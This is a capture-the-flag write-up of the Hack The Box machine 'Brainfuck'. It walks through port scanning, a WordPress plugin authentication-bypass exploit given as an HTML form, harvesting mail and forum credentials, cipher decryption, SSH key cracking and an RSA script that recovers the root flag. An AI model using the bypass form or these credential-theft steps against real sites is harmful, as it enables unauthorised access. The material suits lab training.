---
title: Hack The Box Brain Fuck Write Up
published: true
---

Hey Guys.This is my write up about brain fuck from hack the box.

This is an insane machine.But I think it should be hard not really insane so let's get jump in.

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/info.jpg)

# [](#header-3)Enumeration

```
root@ch4n:~# nmap -sV -sC -sT -p- 10.10.10.17                                             [8/23]
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 23:58 EST                                 
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan                     
Connect Scan Timing: About 0.01% done                                                           
Nmap scan report for brainfuck.htb (10.10.10.17)                                                
Host is up (0.27s latency).                                                                     
Not shown: 65530 filtered ports                                                                 
PORT    STATE SERVICE  VERSION                                                                  
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)             
| ssh-hostkey:          
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)                                  
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)                                 
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)                               
25/tcp  open  smtp     Postfix smtpd            
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d            
|_pop3-capabilities: PIPELINING AUTH-RESP-CODE UIDL USER SASL(PLAIN) RESP-CODES TOP CAPA
143/tcp open  imap     Dovecot imapd            
|_imap-capabilities: LOGIN-REFERRALS AUTH=PLAINA0001 ID more have IMAP4rev1 capabilities LITERAL
+ listed ENABLE post-login SASL-IR Pre-login OK IDLE
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)                                                    
|_http-generator: WordPress 4.7.3               
|_http-server-header: nginx/1.10.0 (Ubuntu)                                                     
|_http-title: 400 The plain HTTP request was sent to HTTPS port                                 
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceNam
e=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29                                                         
|_Not valid after:  2027-04-11T11:19:29                                                         
|_ssl-date: TLS randomness does not represent time                                              
| tls-alpn:             
|_  http/1.1            
| tls-nextprotoneg:                             
|_  http/1.1            
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel                       

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 905.85 seconds
```
In here I noticed that there is no port 80 and also there is smtp.

So I think it is https proto co.

# [](#header-3)Webpage

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/webpage.png)

So when we check the certificate there are three domains and some mails 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/mail.png)

```
mail -  orestis@brainfuck.htb
```

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/two%20domains.png)

```
Domainnames
brainfuck.htb
www.brainfuck.htb
sup3rs3cr3t.brainfuck.htb
```

So I added all these domain name to /etc/hosts

brainfuck.htb

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/brainfuck.png)

sup3rs3cr3t.brainfuck.htb

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/super_secret.png)

When we check these two domain u will see that it is using wordpress.It is obvious right?

So let's check with wpscan is it vulnerable or not 

```
wpscan --url https://brainfuck.htb --disable-tls-checks --api-token <redacted>
```
-- url: The URL of the blog to scan.
--disable-tls-checks: Disables SSL/TLS certificate verification.
--api-token: The WPVulnDB API Token to display vulnerability data
The WordPress version identified is 4.7.3
```
| [!] Title: WP Support Plus Responsive Ticket System <= 8.0.7 - Remote Code Execution (RCE)
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8949
 |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
```
So I search exploit about this 

here is the exploit [https://www.exploit-db.com/exploits/41006](https://www.exploit-db.com/exploits/41006)

I copied the code to my machine then modifed some of it  
```
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="orestis@brainfuck.htb">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```
in the exploit it said like that

```
You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().
```

It means that we dont need a pass to login as admin so I check with the defult user admin

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/exploit.png)

When we click the login it shows nothing there 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/nothing.png)

so I go to brainfuck.htb and refresh the webpage.

we can see that  we are successfully login as admin 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/logging%20in%20as%20admin.png)

here we check the dashboard 
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/dashboard.png)

there are smtp configuration settings with SMTP username and pass
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/smtp%20creds.png)

The password is masked 

Right click on the password field and view page source.

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/to%20see%20the%20masked%20pass.png)

here we got the user called orestis

Creds
```
orestis:value="kHGuERB29DNiNE
```

Let’s use the mail client Evolution to log into orestis’s email. 

When we logged in using the above creds with evolution 

there are two mails 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/two%20mails.png)

when we check root <root@brainfuck.htb> we got the creds
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/super%20secret%20creds.png)
```
username: orestis
password: kIEnnfEKJ#9UmdO
```

When I try to login with this creds to supersecret forum we are successfully logged in 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/logging%20into%20super%20secret.png)

When we check the comments,it seems like texts  are encrypted

Based on the comments there, orestis seems to have lost his SSH key and wants the admin to send it to him on an encrypted thread. 
One other thing we notice is that orestis always signs his message with the “Orestis — Hacking for fun and profit” phrase.
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/try%20to%20find%20key%20with%20orestis.jpg)
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/try%20to%20find%20key%20cipher.jpg)
there you can notice that orestis’s comments are signed with the same message we saw above except the message is in encrypted form.

I'm familiar with cryptography and I know that  it is vigenere cipher.

So let's decrypt these

```
cipher text - Pieagnm - Jkoijeg nbw zwx mle grwsnn
key - Orestis - Hacking for fun and profit
```
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/found%20key%20as%20brain%20fuck.png)
so we got the text as BrainfuCkmybrainfuckmybrainfu 

so I know that the key should be fuckmybrain when we decrypt with this key we got id_rsa

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/got%20id_rsa.png)

https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa 

After downloading id_rsa I give a permission to it then it ask for us  so I'm using ssh2john to crack this.

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/cracking%20ssh%20passs.jpg)

So here we got the ssh pass

```
3poulakia!
```
let's login to ssh 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/logging%20into%20ssh%20and%20grab%20user%20flag.jpg)

After logging into the ssh we grab the user flag.

# [](#header-3)Privillege Escalation

I found some interesting files in orestis home directory.so let's check that 
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/ssh%20user%20enum.png)
when we check 
encrypt.sage
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/encrypt.sage.jpg)

```
orestis@brainfuck:~$ cat encrypt.sage
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

It seems like RSA.

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/debug.txt%20and%20output.txt%20.png)

debug.txt
```
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
```

```
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```
there are some values about rsa 

they given as p,q and e 

and cipher text so let's decrypt to get a plain text.

I wrote a python program to get the plain text
```
from Crypto.Util.number import *

p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
n = p * q
phin = (p-1)*(q-1)
d = inverse(e,phin)
pt = pow(ct,d,n)
print(hex(pt)[2:-1].decode('hex'))
```
you can read about rsa [here](https://simple.wikipedia.org/wiki/RSA_algorithm)

When I run the script,we got the root flag 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/brain-fuck/grab%20the%20root%20flag.jpg)

So that's it guys if you enjoy my write up 

Give me some respects on HTB
  
<script src="https://www.hackthebox.eu/badge/81292"></script>
